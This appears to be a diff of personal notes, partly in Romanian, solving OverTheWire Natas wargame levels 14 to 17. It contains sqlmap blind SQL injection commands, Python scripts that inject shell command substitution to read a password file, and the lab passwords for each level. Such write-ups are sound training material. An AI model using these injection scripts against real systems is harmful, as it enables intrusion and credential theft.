@@ -98,4 +98,68 @@ PAROLA: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
 
 LEVEL_14: http://natas15.natas.labs.overthewire.org natas15 TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
 
-username=whatever" UNION ALL SELECT 1,2 FROM users WHERE username="natas16" AND substring (password,$1$,1) = BINARY "$a$" LIMIT 1 OFFSET 0;#
+Am incercat sa folosesc un atac INTRUDER de tip Cluster Bomb, nu am reusit.
+sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" -technique=B 
+--string="This user exists" --auth-type=Basic --auth-cred=natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB 
+--data "username=natas16" -D natas15 -T users -C username,password --dump --level=5 --risk=3
+PAROLA: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+
+LEVEL_15: http://natas16.natas.labs.overthewire.org natas16 TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+
+import requests
+import string
+
+base_url = "http://natas16.natas.labs.overthewire.org"
+auth_username = "natas16"
+auth_password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
+
+all_chars = string.ascii_letters + string.digits
+
+password_dictionary = []
+check_str = "sonatas"
+for c in all_chars:
+    querystr = ''.join([check_str, '$(grep ', c, ' /etc/natas_webpass/natas17)'])
+    payload = {'needle': querystr, 'submit': 'Search'}
+    r = requests.get(base_url, auth=(auth_username, auth_password), params=payload)
+    if check_str not in r.text:
+        password_dictionary.append(c)
+        print("Password Dictionary: {0}".format(''.join(password_dictionary)))
+
+print("Dictionary build complete.")
+
+import requests
+
+base_url = "http://natas16.natas.labs.overthewire.org/"
+auth_username = "natas16"
+auth_password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
+
+all_chars = 'bdhkmnsuvBCEHIKLRSUX0179'
+
+password_dictionary = []
+check_str = "sonatas"
+i = 0
+while len(password_dictionary) < len(auth_password):
+    char = all_chars[i]
+    querystr = ''.join([check_str, '$(grep ^', ''.join(password_dictionary), char, ' /etc/natas_webpass/natas17)'])
+    payload = {'needle': querystr, 'submit': 'Search'}
+    r = requests.get(base_url, auth=(auth_username, auth_password), params=payload)
+    if check_str not in r.text:
+        password_dictionary.append(char)
+        print("Password for natas17:", ''.join(password_dictionary))
+    i = i + 1
+    if i >= len(all_chars):
+        i = 0
+print("Password complete.")
+PAROLA: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
+
+LEVEL_16: http://natas17.natas.labs.overthewire.org natas17 XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
+
+sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php?debug" -technique=B --auth-type=Basic 
+--auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd --data "username=natas17" -D natas18 -T users -C username,password --dump --level=5 --risk=3
+PAROLA: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
+
+LEVEL_17: http://natas18.natas.labs.overthewire.org natas18 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
+
+
+
+
